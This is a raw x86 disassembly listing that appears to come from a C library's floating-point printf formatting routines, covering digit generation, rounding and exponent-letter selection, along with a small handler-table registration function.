mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.08075680
jmp 0x8068a51
mov eax, ecx
mov edx, 0x66666667
imul edx
mov eax, ecx
sar eax, 0x1f
sar edx, 2
sub edx, eax
mov eax, esi
mov ecx, edx
cdq
idiv ecx
lea eax, [eax + 0x30]
mov esi, edx
mov dword [var_28h], edx
mov dword [ebx], eax
add ebx, 4
cmp ecx, 0xa
jg 0x8068fe5
jmp 0x80689e3
sub ebx, 4
dec edi
cmp edi, dword [var_d0h]
jle 0x8068949
cmp dword [ebx - 4], 0x30
je 0x8069016
jmp 0x8068949
mov ecx, dword [var_58h]
lea eax, [edx - 4]
cmp dword [edx - 4], ecx
cmove edx, eax
sub edx, 4
cmp edx, dword [var_bch]
jb 0x8069060
cmp dword [edx], 0x39
je 0x806919f
cmp edx, dword [var_bch]
jb 0x8069060
inc dword [edx]
jmp 0x8068937
cmp dword [var_3ch], 0x66
je 0x80690b2
mov eax, dword [var_bch]
mov dword [eax], 0x31
mov eax, dword [var_2ch]
test eax, eax
jne 0x80690ac
mov eax, dword [var_28h]
inc eax
mov dword [var_28h], eax
mov eax, dword [var_cch]
add eax, edi
cmp eax, dword [var_d4h]
jle 0x8068937
mov edx, eax
sub edx, dword [var_d4h]
lea eax, [edx*4]
sub edi, edx
sub ebx, eax
jmp 0x8068937
mov eax, dword [var_28h]
dec eax
jmp 0x806907d
mov edx, dword [var_d4h]
cmp dword [var_cch], edx
je 0x80690db
sub dword [var_bch], 4
inc dword [var_cch]
mov ecx, dword [var_bch]
mov dword [ecx], 0x31
jmp 0x8069080
sub dword [var_bch], 4
mov eax, dword [var_58h]
mov ecx, dword [var_bch]
mov edx, dword [arg_ch]
mov dword [ecx], eax
sub ecx, 4
mov dword [ecx], 0x31
mov dword [var_bch], ecx
test byte [edx + 0xc], 8
jne 0x8069109
test edi, edi
jle 0x806911e
mov ecx, dword [var_cch]
mov eax, dword [var_bch]
inc edi
mov dword [eax + ecx*4 + 8], 0x30
mov edx, 0
add edi, dword [var_cch]
inc dword [var_28h]
test edx, edx
mov dword [var_cch], 1
mov esi, 0x80aad18
je 0x806914d
mov dword [esp], 4
call section.
mov esi, eax
mov ecx, dword [esi]
test ecx, ecx
je 0x8069173
mov edx, dword [arg_ch]
mov eax, dword [edx + 8]
mov edx, 0x45
test byte [ecx + eax*2 + 1], 1
mov eax, 0x65
cmove edx, eax
mov dword [var_3ch], edx
jmp 0x8069080
mov ecx, 0
test ecx, ecx
je 0x8069198
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [esi], eax
mov ecx, eax
jmp 0x8069153
mov eax, dword [0x80a9ab4]
jmp 0x8069188
mov dword [edx], 0x30
sub edx, 4
cmp edx, dword [var_bch]
jb 0x8069060
cmp dword [edx], 0x39
je 0x806919f
jmp 0x8069051
mov esi, esi
mov dword [edx], 0x30
sub edx, 4
mov eax, dword [edx]
cmp eax, dword [var_58h]
je 0x8068924
cmp eax, 0x39
je 0x80691c0
jmp 0x806891c
mov eax, dword [ebx - 4]
cmp eax, dword [var_58h]
je 0x8069244
test al, 1
jne 0x8068904
mov ecx, dword [var_24h]
cmp ecx, 1
je 0x8069236
mov eax, dword [var_34h]
test eax, eax
jne 0x8068904
test ecx, ecx
je 0x8068937
mov eax, dword [var_20h]
lea eax, [eax + ecx*4]
mov esi, dword [eax - 4]
test esi, esi
jne 0x8069229
sub eax, 4
sub eax, 4
dec ecx
je 0x8068937
mov esi, dword [eax]
test esi, esi
je 0x8069219
test ecx, ecx
jne 0x8068904
jmp 0x8068937
mov eax, dword [var_20h]
mov eax, dword [eax]
test eax, eax
jne 0x80691f6
jmp 0x8068937
test byte [ebx - 8], 1
jmp 0x80691e8
mov eax, dword [var_d8h]
test eax, eax
jne 0x80688d1
mov eax, dword [var_d0h]
inc esi
inc eax
cmp dword [var_d0h], 1
cmovl eax, dword [var_d0h]
mov dword [var_d0h], eax
jmp 0x80688d1
mov eax, dword [var_20h]
mov eax, dword [eax]
test eax, eax
jne 0x80688b0
jmp 0x80688ec
test esi, esi
jle 0x806889a
cmp dword [var_24h], 1
jg 0x8068892
mov eax, dword [var_20h]
mov eax, dword [eax]
test eax, eax
je 0x806889a
jmp 0x8068892
mov eax, dword [var_b8h]
mov edx, dword [var_58h]
dec dword [var_28h]
mov ebx, eax
mov dword [eax + 8], 0x30
mov dword [eax + 0xc], edx
add ebx, 0x10
jmp 0x806889a
mov edx, dword [var_c4h]
lea eax, [edx*4 + 8]
mov dword [esp], eax
call fcn.08050fe0
mov edx, 0xffffffff
test eax, eax
mov dword [var_b8h], eax
jne 0x806880c
jmp 0x8068190
lea esi, [esi]
mov dword [esp], eax
call fcn.0807adb0
test eax, eax
je 0x80687db
jmp 0x80687d6
lea eax, [ebx - 2]
mov esi, dword [var_d4h]
mov dword [var_c8h], 1
mov dword [var_3ch], eax
mov eax, dword [var_d4h]
dec esi
add eax, 7
mov dword [var_c4h], eax
jmp 0x8068779
cmp dword [var_28h], 4
jle 0x806873e
jmp 0x8069315
mov eax, dword [arg_ch]
mov dword [var_d0h], 6
mov dword [var_3ch], 0x66
mov dword [var_d4h], 0x7fffffff
mov dword [var_d8h], 1
mov esi, dword [eax]
mov eax, dword [var_2ch]
test esi, esi
cmovs esi, dword [var_d0h]
test eax, eax
mov dword [var_d0h], esi
jne 0x80693a7
mov eax, dword [var_28h]
lea edx, [eax + 1]
lea eax, [esi + eax + 2]
mov dword [var_c8h], edx
mov dword [var_c4h], eax
jmp 0x8068798
mov ecx, dword [var_d0h]
mov dword [var_c8h], 1
add ecx, 2
mov dword [var_c4h], ecx
jmp 0x8068798
mov edx, 0
test edx, edx
je 0x80693f1
mov dword [esp], 3
call section.
mov ecx, dword [arg_ch]
mov ebx, dword [ecx + 8]
mov eax, dword [eax]
mov eax, dword [eax + 0x30]
add eax, 0x200
mov dword [esi], eax
jmp 0x80686ed
mov eax, dword [0x80a9ab4]
jmp 0x80693e0
mov esi, dword [edx]
mov dword [var_d0h], 6
mov dword [var_3ch], ebx
mov dword [var_c8h], 1
mov dword [var_d4h], 0x7fffffff
mov dword [var_d8h], 1
test esi, esi
cmovs esi, dword [var_d0h]
mov ecx, esi
mov dword [var_d0h], esi
add ecx, 8
jmp 0x80693ba
mov ecx, 0
test ecx, ecx
je 0x8069464
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x30]
add eax, 0x200
mov dword [ebx], eax
jmp 0x80686b7
mov eax, dword [0x80a9ab4]
jmp 0x8069453
lea edx, [esi*4]
mov eax, dword [edi + edx]
test eax, eax
je 0x80695f9
mov eax, dword [var_20h]
bsf ecx, dword [edi + edx]
cmp dword [eax + edx], 0
je 0x8069494
bsf eax, dword [eax + edx]
cmp eax, ecx
jge 0x8069494
mov ecx, eax
test esi, esi
jne 0x80694ab
mov eax, 0x20
sub eax, dword [var_98h]
cmp eax, ecx
jg 0x80695a0
mov dword [var_a0h], 0x20
mov eax, dword [var_98h]
sub dword [var_a0h], eax
cmp dword [var_a0h], ecx
jg 0x8069537
mov edx, dword [var_a0h]
sub ebx, esi
mov dword [esp], edi
mov dword [var_8h], ebx
lea ebx, [esi*4]
lea eax, [ebx + edi]
mov dword [var_ch], edx
mov dword [var_4h], eax
call fcn.0808c750
mov eax, esi
mov ecx, dword [var_a0h]
not eax
add dword [var_34h], eax
mov eax, dword [var_24h]
mov dword [var_ch], ecx
sub eax, esi
mov dword [var_8h], eax
mov eax, dword [var_20h]
lea ebx, [ebx + eax]
mov dword [esp], eax
mov dword [var_4h], ebx
call fcn.0808c750
mov edx, dword [var_20h]
mov eax, dword [var_24h]
sub eax, esi
mov edx, dword [edx + eax*4 - 4]
lea ecx, [eax - 1]
test edx, edx
cmove eax, ecx
mov dword [var_24h], eax
jmp 0x806866f
mov eax, dword [var_a0h]
sub ebx, esi
mov dword [esp], edi
mov dword [var_ch], eax
lea eax, [ebx + 1]
lea ebx, [esi*4]
mov dword [var_8h], eax
lea eax, [ebx + edi - 4]
mov dword [var_4h], eax
call fcn.0808c750
mov eax, dword [var_24h]
mov edx, dword [var_a0h]
sub dword [var_34h], esi
sub eax, esi
mov dword [var_ch], edx
inc eax
mov edx, dword [var_20h]
mov dword [var_8h], eax
lea eax, [ebx + edx - 4]
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0808c750
mov edx, dword [var_20h]
mov eax, dword [var_24h]
sub eax, esi
mov edi, dword [edx + eax*4]
lea ecx, [eax + 1]
test edi, edi
cmovne eax, ecx
jmp 0x806952f
mov edx, dword [var_98h]
mov dword [var_8h], ebx
mov dword [var_4h], edi
mov dword [esp], edi
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, dword [var_24h]
mov ecx, dword [var_98h]
mov dword [var_8h], eax
mov eax, dword [var_20h]
mov dword [var_ch], ecx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c6f0
test eax, eax
mov dword [var_78h], eax
je 0x806866f
mov edx, dword [var_24h]
mov eax, dword [var_20h]
mov ecx, dword [var_78h]
mov dword [eax + edx*4], ecx
inc dword [var_24h]
jmp 0x806866f
mov eax, dword [var_20h]
bsf ecx, dword [eax + edx]
jmp 0x8069494
mov eax, dword [var_38h]
mov dword [var_8h], ebx
mov dword [var_4h], eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
js 0x80685ae
lea ecx, [ebx*4]
mov dword [var_34h], ebx
mov edi, dword [var_30h]
cld
mov esi, dword [var_38h]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov ebx, dword [var_34h]
mov eax, dword [var_30h]
bsr edx, dword [eax + ebx*4 - 4]
movzx ecx, byte [var_8ch]
xor edx, 0x1f
mov eax, ebx
shl eax, 5
sub eax, edx
sub eax, 0x41
mov dword [var_88h], eax
mov eax, 1
shl eax, cl
or dword [var_90h], eax
jmp 0x80685b1
mov ecx, dword [var_94h]
mov eax, dword [ecx + 4]
sub eax, 2
mov dword [var_10h], eax
mov eax, dword [ecx]
mov dword [var_8h], ebx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov eax, dword [var_30h]
mov dword [var_4h], eax
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.0808c7c0
mov edx, dword [var_94h]
mov dword [var_78h], eax
mov eax, dword [edx + 4]
mov edx, dword [var_78h]
add eax, dword [var_34h]
lea ebx, [eax - 2]
sub eax, 3
test edx, edx
cmove ebx, eax
jmp 0x806859f
mov eax, dword [var_9ch]
add eax, 0x1f
cmp dword [var_9ch], 0xffffffff
cmovg eax, dword [var_9ch]
sar eax, 5
mov edx, eax
lea eax, [ecx + eax*4]
shl edx, 5
mov dword [esp], eax
sub dword [var_9ch], edx
mov edx, dword [var_9ch]
mov dword [var_ch], edx
mov edx, dword [var_24h]
mov dword [var_8h], edx
lea edx, [var_48h]
mov dword [var_4h], edx
call fcn.0808c6f0
mov ecx, dword [var_70h]
mov esi, dword [var_28h]
mov dword [var_78h], eax
lea eax, [ecx + esi]
mov ecx, dword [var_78h]
cmp eax, 0xffffffff
lea edx, [eax + 0x1f]
mov edi, eax
cmovle edi, edx
sar edi, 5
add edi, dword [var_24h]
test ecx, ecx
mov dword [var_24h], edi
je 0x8068532
mov ecx, dword [var_20h]
mov eax, dword [var_78h]
mov dword [ecx + edi*4], eax
inc dword [var_24h]
jmp 0x8068532
test esi, esi
js 0x8069785
mov edx, dword [var_70h]
mov dword [esp], ecx
lea eax, [edx + esi]
mov dword [var_ch], eax
mov eax, dword [var_24h]
mov dword [var_8h], eax
lea eax, [var_48h]
mov dword [var_4h], eax
call fcn.0808c6f0
mov dword [var_28h], 0
mov dword [var_78h], eax
mov edx, dword [var_24h]
mov ecx, dword [var_78h]
mov eax, dword [var_20h]
jmp 0x80695ee
mov eax, dword [var_70h]
mov dword [esp], ecx
mov dword [var_a4h], 0
mov dword [var_a8h], 0xc
mov dword [var_ach], 0x80a70f0
mov dword [var_ch], eax
mov eax, dword [var_24h]
mov dword [var_8h], eax
lea eax, [var_48h]
mov dword [var_4h], eax
call fcn.0808c6f0
mov esi, dword [var_28h]
mov dword [var_78h], eax
mov edx, dword [var_24h]
mov dword [var_2ch], 1
mov eax, dword [var_20h]
mov ecx, dword [var_78h]
neg esi
mov dword [var_28h], esi
mov dword [eax + edx*4], ecx
inc dword [var_24h]
sub dword [var_ach], 0x10
mov eax, dword [var_ach]
cmp esi, dword [eax + 0xc]
jl 0x8069890
mov edx, dword [eax + 4]
mov ecx, dword [var_24h]
sub edx, 2
cmp ecx, edx
jge 0x8069b15
mov eax, dword [var_20h]
mov dword [var_8h], edx
mov dword [var_10h], ecx
mov edx, dword [var_ach]
mov dword [var_ch], eax
mov eax, dword [edx]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.0808c7c0
mov ecx, dword [var_ach]
mov edx, dword [var_24h]
mov dword [var_78h], eax
mov esi, dword [var_78h]
mov eax, edx
add eax, dword [ecx + 4]
lea ebx, [eax - 2]
sub eax, 3
test esi, esi
cmove ebx, eax
mov esi, dword [var_28h]
mov eax, dword [var_38h]
bsr ecx, dword [eax + ebx*4 - 4]
mov eax, ebx
xor ecx, 0x1f
sub eax, edx
mov dword [var_b0h], ecx
shl eax, 5
sub eax, ecx
lea edi, [eax + 0x1f]
lea eax, [esi + 3]
cmp edi, eax
je 0x8069ab3
lea eax, [esi + 3]
cmp edi, eax
jl 0x8069aa5
je 0x8069961
dec dword [var_a8h]
cmp dword [var_ach], 0x80a7030
je 0x80698b8
test esi, esi
jg 0x80697e1
mov eax, dword [var_a4h]
mov dword [var_28h], eax
jmp 0x806866f
test esi, esi
jle 0x80698aa
mov eax, dword [var_24h]
mov dword [var_ch], 0xa
mov edi, 4
mov dword [var_8h], eax
mov eax, dword [var_20h]
mov dword [var_4h], eax
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.0808cae0
mov eax, edi
mov esi, dword [var_28h]
mov ecx, dword [var_38h]
bsf edx, dword [ecx]
mov ebx, dword [var_24h]
cmp esi, 5
cmovl eax, esi
cmp edx, eax
jge 0x8069940
cmp esi, 5
mov eax, edi
mov edx, 0x20
cmovl eax, esi
mov dword [var_8h], ebx
mov dword [var_4h], ecx
sub edx, eax
mov eax, dword [var_20h]
mov dword [var_ch], edx
mov dword [esp], eax
call fcn.0808c6f0
test eax, eax
mov dword [var_78h], eax
je 0x8069931
mov eax, dword [var_20h]
mov ecx, dword [var_78h]
mov dword [eax + ebx*4], ecx
inc ebx
mov dword [var_24h], ebx
or dword [var_a4h], 1
jmp 0x80698aa
cmp esi, 5
mov eax, edi
mov dword [var_8h], ebx
cmovl eax, esi
mov dword [var_4h], ecx
mov dword [var_ch], eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.0808c750
jmp 0x8069931
mov eax, dword [var_38h]
lea edx, [eax + ebx*4]
mov dword [var_f8h], eax
mov eax, dword [var_4ch]
cmp dword [edx - 4], eax
jb 0x8069987
jne 0x8069890
mov eax, dword [var_50h]
cmp dword [edx - 8], eax
jae 0x8069890
movzx ecx, byte [var_a8h]
mov eax, 1
sub esi, edi
mov dword [var_28h], esi
shl eax, cl
or dword [var_a4h], eax
mov eax, dword [var_b0h]
sub eax, esi
inc esi
cmovg eax, dword [var_b0h]
xor edi, edi
mov dword [var_b0h], eax
mov eax, dword [var_f8h]
mov ecx, dword [eax]
test ecx, ecx
jne 0x80699ce
add eax, 4
inc edi
mov edx, dword [eax]
test edx, edx
je 0x80699c4
cmp dword [var_b0h], 0x1f
je 0x8069a7e
mov ecx, dword [var_f8h]
bsf edx, dword [ecx + edi*4]
test edi, edi
jne 0x80699f8
mov eax, 0x1f
sub eax, dword [var_b0h]
cmp eax, edx
jg 0x8069a4b
mov eax, 0x1f
sub eax, dword [var_b0h]
cmp eax, edx
jg 0x8069a34
mov ecx, dword [var_f8h]
mov dword [var_ch], eax
sub ebx, edi
mov dword [var_8h], ebx
lea eax, [ecx + edi*4]
mov dword [var_4h], eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.0808c750
mov dword [var_24h], ebx
mov esi, dword [var_28h]
jmp 0x8069890
mov edx, dword [var_f8h]
sub ebx, edi
mov dword [var_ch], eax
inc ebx
mov dword [var_8h], ebx
lea eax, [edx + edi*4 - 4]
jmp 0x8069a1a
mov eax, dword [var_b0h]
mov dword [var_8h], ebx
mov dword [var_4h], ecx
lea edi, [ebx + 1]
inc eax
mov dword [var_ch], eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.0808c6f0
mov dword [var_24h], edi
mov dword [var_78h], eax
mov edx, dword [var_78h]
mov eax, dword [var_20h]
mov dword [eax + edi*4 - 4], edx
jmp 0x8069a2c
mov eax, ebx
sub eax, edi
test eax, eax
jle 0x8069aa1
mov edx, dword [var_f8h]
mov esi, dword [var_20h]
lea ecx, [edx + edi*4]
mov edx, eax
mov eax, dword [ecx]
add ecx, 4
mov dword [esi], eax
add esi, 4
dec edx
jne 0x8069a94
sub ebx, edi
jmp 0x8069a29
mov edx, dword [var_38h]
mov dword [var_f8h], edx
jmp 0x8069987
cmp ecx, 0x1c
jg 0x8069ad9
mov ecx, 0x1c
mov eax, 0xa
mov dword [var_50h], 0
sub ecx, dword [var_b0h]
shl eax, cl
mov dword [var_4ch], eax
jmp 0x806987f
mov eax, 0x20
lea edx, [var_50h]
mov dword [var_50h], 0xa0000000
sub eax, dword [var_b0h]
mov dword [var_4ch], 0
mov dword [var_8h], 2
mov dword [var_4h], edx
mov dword [esp], edx
mov dword [var_ch], eax
call fcn.0808c6f0
mov esi, dword [var_28h]
jmp 0x806987f
mov dword [var_10h], edx
mov edx, dword [var_ach]
mov eax, dword [edx]
mov dword [var_8h], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov eax, dword [var_20h]
jmp 0x8069826
mov dword [var_68h], 0x80a0fb8
mov dword [var_6ch], 0x80a0fd4
jmp 0x806812f
mov ecx, 0
test ecx, ecx
je 0x8069b73
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8068110
mov eax, dword [0x80a9ab4]
jmp 0x8069b60
lea esi, [esi]
mov dword [esp], ebx
mov dword [var_4h], esi
mov dword [var_8h], edi
call fcn.08084990
test eax, eax
je 0x8069c27
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x8069bb4
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8069bfb
mov ecx, dword [arg_ch]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x8069beb
mov dword [var_68h], 0x80a0fbc
mov dword [var_6ch], 0x80a0fe4
fld xword [ebp - 0x1c]
fldz
xor edx, edx
fucompi st(1)
fstp st(0)
seta dl
mov dword [var_40h], edx
jmp 0x8068136
mov dword [var_68h], 0x80a0fc0
mov dword [var_6ch], 0x80a0ff4
jmp 0x8069bd5
mov eax, 0
test eax, eax
je 0x8069c20
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8069bba
mov eax, dword [0x80a9ab4]
jmp 0x8069c10
lea eax, [var_40h]
mov dword [var_sp_18h], edi
mov dword [var_10h], ebx
mov dword [var_ch], eax
mov dword [var_sp_14h], esi
mov dword [var_4h], 2
lea eax, [var_28h]
mov dword [var_8h], eax
lea eax, [var_48h]
mov dword [esp], eax
call fcn.0808d740
mov edi, eax
mov dword [var_24h], eax
shl edi, 5
sub edi, 0x3f
mov dword [var_70h], edi
jmp 0x8068445
mov eax, dword [ebx]
fld qword [eax]
fst qword [ebp - 0x84]
fst qword [ebp - 0x1c]
fstp qword [esp]
call fcn.08084960
test eax, eax
je 0x8069d0c
mov eax, 0
mov dword [var_40h], 0
mov ebx, 0x80aad18
test eax, eax
je 0x8069ca7
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8069ce0
mov ecx, dword [arg_ch]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x8069ccd
mov dword [var_68h], 0x80a0fb4
mov dword [var_6ch], 0x80a0fc4
jmp 0x8068136
mov dword [var_68h], 0x80a0fb8
mov dword [var_6ch], 0x80a0fd4
jmp 0x8068136
mov eax, 0
test eax, eax
je 0x8069d05
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8069cad
mov eax, dword [0x80a9ab4]
jmp 0x8069cf5
fld qword [ebp - 0x84]
fstp qword [esp]
call fcn.08084930
test eax, eax
je 0x8069db7
fld qword [ebp - 0x84]
fldz
xor edx, edx
mov eax, 0
mov ebx, 0x80aad18
fucompi st(1)
fstp st(0)
seta dl
test eax, eax
mov dword [var_40h], edx
je 0x8069d52
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8069d8b
mov ecx, dword [arg_ch]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x8069d78
mov dword [var_68h], 0x80a0fbc
mov dword [var_6ch], 0x80a0fe4
jmp 0x8068136
mov dword [var_68h], 0x80a0fc0
mov dword [var_6ch], 0x80a0ff4
jmp 0x8068136
mov eax, 0
test eax, eax
je 0x8069db0
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8069d58
mov eax, dword [0x80a9ab4]
jmp 0x8069da0
fld qword [ebp - 0x84]
lea eax, [var_40h]
mov dword [var_4h], 2
mov dword [var_ch], eax
lea eax, [var_28h]
mov dword [var_8h], eax
lea eax, [var_48h]
mov dword [esp], eax
fstp qword [esp + 0x10]
call fcn.0808d640
mov edi, eax
mov dword [var_24h], eax
shl edi, 5
sub edi, 0x34
mov dword [var_70h], edi
jmp 0x8068136
mov dword [var_64h], 0
jmp 0x80680b0
mov eax, dword [var_5ch]
cmp byte [eax], 0
je 0x8069df5
mov ecx, dword [var_60h]
test ecx, ecx
jne 0x80680b0
mov dword [var_60h], 0xfffffffe
mov ecx, dword [arg_ch]
movzx eax, byte [ecx + 0xc]
jmp 0x80680b7
mov eax, dword [0x80a9ab4]
jmp 0x8068091
mov ecx, 0
test ecx, ecx
je 0x8069e54
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov eax, dword [eax + 0xd4]
jmp 0x8068097
mov eax, dword [0x80a9ab4]
jmp 0x8069e46
mov eax, dword [arg_ch]
test byte [eax + 0xd], 1
jne 0x8069e8e
mov edx, 0
test edx, edx
je 0x8069e87
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x28]
mov dword [var_5ch], eax
jmp 0x806809a
mov eax, dword [0x80a9ab4]
jmp 0x8069e79
mov ecx, 0
test ecx, ecx
je 0x8069eab
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov eax, dword [eax + 0x30]
jmp 0x8069e7f
mov eax, dword [0x80a9ab4]
jmp 0x8069ea3
mov dword [var_64h], 0
jmp 0x8069e1b
mov eax, dword [0x80a9ab4]
jmp 0x8068041
mov eax, 0
test eax, eax
je 0x8069ee8
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov eax, dword [eax + 0x34]
jmp 0x8068047
mov eax, dword [0x80a9ab4]
jmp 0x8069edd
mov eax, dword [0x80a9ab4]
jmp 0x8067fff
mov eax, dword [0x80a9ab4]
jmp 0x8067fdd
mov ecx, 0
test ecx, ecx
je 0x8069f87
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov eax, dword [eax + 0x2c]
mov dword [var_54h], eax
cmp byte [eax], 0
jne 0x8069f44
mov eax, 0
test eax, eax
je 0x8069f80
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x24]
mov dword [var_54h], eax
mov edx, 0
test edx, edx
je 0x8069f79
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov eax, dword [eax + 0xd0]
test eax, eax
mov dword [var_58h], eax
jne 0x8068008
mov ecx, 0
test ecx, ecx
jmp 0x8067fed
mov eax, dword [0x80a9ab4]
jmp 0x8069f59
mov eax, dword [0x80a9ab4]
jmp 0x8069f3b
mov eax, dword [0x80a9ab4]
jmp 0x8069f18
mov esi, esi
push ebp
mov ebp, esp
push esi
mov ecx, dword [arg_ch]
push ebx
mov ebx, dword [arg_8h]
movzx edx, byte [ecx]
cmp dl, 0x7f
je 0x8069fe4
test dl, dl
jle 0x8069fe4
movsx eax, dl
xor esi, esi
cmp ebx, eax
jbe 0x8069fcd
movsx eax, dl
inc ecx
inc esi
sub ebx, eax
movzx eax, byte [ecx]
cmp al, 0x7f
mov edx, eax
je 0x8069fcd
test al, al
jl 0x8069fcd
je 0x8069fd3
movsx eax, al
cmp ebx, eax
ja 0x8069fb0
mov eax, esi
pop ebx
pop esi
leave
ret
movsx edx, byte [ecx - 1]
lea eax, [ebx - 1]
mov ecx, edx
xor edx, edx
div ecx
add esi, eax
jmp 0x8069fcd
xor eax, eax
jmp 0x8069fcf
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
mov eax, edx
mov esi, ecx
push ebx
sub esp, 0x10
mov ecx, dword [arg_10h]
mov dword [var_10h], edx
test ecx, ecx
jne 0x806a013
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret 0xc
lea eax, [edi + esi*4]
sub edx, eax
mov dword [var_4h], eax
mov eax, dword [arg_10h]
sar edx, 2
mov dword [var_8h], edx
lea ebx, [eax + esi]
lea ebx, [edi + ebx*4]
mov dword [esp], ebx
call fcn.08077700
mov eax, dword [arg_8h]
lea ecx, [ebx - 4]
movzx edx, byte [eax]
lea esi, [esi]
movsx edx, dl
inc dword [arg_8h]
dec esi
mov eax, dword [edi + esi*4]
mov dword [ecx], eax
sub ecx, 4
dec edx
jne 0x806a046
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov dword [ecx], edx
movzx edx, byte [eax]
sub ecx, 4
cmp dl, 0x7f
je 0x806a080
test dl, dl
jl 0x806a080
jne 0x806a072
dec eax
mov dword [arg_8h], eax
movzx edx, byte [eax]
movsx eax, dl
cmp esi, eax
ja 0x806a040
lea esi, [esi]
dec esi
mov eax, dword [edi + esi*4]
mov dword [ecx], eax
sub ecx, 4
cmp ecx, edi
ja 0x806a080
mov edx, dword [arg_10h]
mov ecx, dword [var_10h]
lea eax, [ecx + edx*4]
jmp 0x806a009
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
cmp ebx, 0xff
ja 0x806a128
mov edx, dword [0x80aad28]
test edx, edx
je 0x806a0f8
mov eax, dword [arg_ch]
mov dword [edx + ebx*4], eax
mov eax, dword [0x80aad94]
mov edx, dword [arg_10h]
mov dword [eax + ebx*4], edx
xor edx, edx
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov dword [var_sp_4h], 8
mov dword [esp], 0x100
call fcn.08051730
test eax, eax
mov dword [0x80aad94], eax
mov edx, 0xffffffff
je 0x806a0f1
lea edx, [eax + 0x400]
mov dword [0x80aad28], edx
jmp 0x806a0de
call fcn.08048b20
mov edx, 0xffffffff
mov dword [eax], 0x16
jmp 0x806a0f1
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x16c
mov dword [var_138h], 0
mov edx, dword [arg_ch]
mov eax, dword [arg_ch]
mov ebx, dword [arg_10h]
mov dword [var_108h], 0
mov dword [var_10ch], 0
mov edx, dword [edx + 4]
mov eax, dword [eax]
mov dword [var_134h], edx
mov dword [var_130h], eax
mov eax, dword [arg_ch]
movzx ecx, byte [eax + 0xd]
mov eax, ecx
shr al, 2
mov edx, eax
and edx, 1
and ecx, 1
mov dword [var_13ch], edx
jne 0x806b7b4
mov ecx, 0
test ecx, ecx
je 0x806b7aa
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x24]
mov dword [var_104h_2], eax
mov eax, 0
test eax, eax
je 0x806b7a0
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x30]
mov dword [var_100h], eax
mov eax, dword [var_104h]
cmp byte [eax], 0
je 0x806b807
mov esi, dword [var_100h_2]
test esi, esi
je 0x806b807
mov edx, dword [var_8h]
movzx edx, byte [edx + 0xc]
mov byte [var_161h], dl
and edx, 1
je 0x806b6a4
mov eax, dword [ebx]
mov ebx, dword [eax]
mov esi, dword [eax + 4]
mov edi, dword [eax + 8]
mov dword [var_1ch], ebx
mov dword [var_18h], esi
mov dword [esp], ebx
mov dword [var_14h], edi
mov dword [var_4h], esi
mov dword [var_8h], edi
call fcn.080849f0
test eax, eax
je 0x806b5b2
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x806a268
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x806b576
mov ecx, dword [var_8h]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x806b55d
mov dword [var_108h_2], 0x80a0fb4
mov dword [var_10ch_2], 0x80a0fc4
mov dword [var_118h], 0
mov ebx, dword [var_108h_2]
